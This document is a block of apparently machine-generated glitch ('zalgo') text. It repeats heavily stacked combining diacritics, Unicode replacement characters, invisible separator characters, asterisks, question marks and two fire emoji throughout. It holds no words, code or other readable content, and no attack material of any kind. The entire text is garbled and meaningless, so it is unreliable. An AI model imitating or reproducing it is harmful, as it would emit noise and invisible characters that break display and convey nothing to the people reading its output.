̡̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋͘